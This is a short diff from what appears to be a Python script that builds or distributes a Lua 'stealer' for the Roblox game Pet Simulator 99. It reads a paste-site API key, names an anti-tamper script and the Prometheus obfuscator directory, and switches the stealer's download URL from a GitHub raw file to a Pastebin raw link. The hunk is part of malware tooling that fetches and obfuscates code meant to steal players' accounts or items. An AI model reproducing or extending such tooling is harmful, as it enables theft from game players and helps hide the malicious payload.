@@ -12,7 +12,7 @@ PASTEFY_API_KEY = os.getenv("PASTEFY_API_KEY")
 
 # ==================== URLs ====================
 ANTI_TAMPER_URL = "https://raw.githubusercontent.com/dino242/Moneyyyy/main/anti.lua"
-PS99_STEALER_URL = "https://raw.githubusercontent.com/dino242/Moneyyyy/main/main-stealer.lua"
+PS99_STEALER_URL = "https://pastebin.com/raw/pusiN4a0"
 
 PROMETHEUS_DIR = "Prometheus"
 
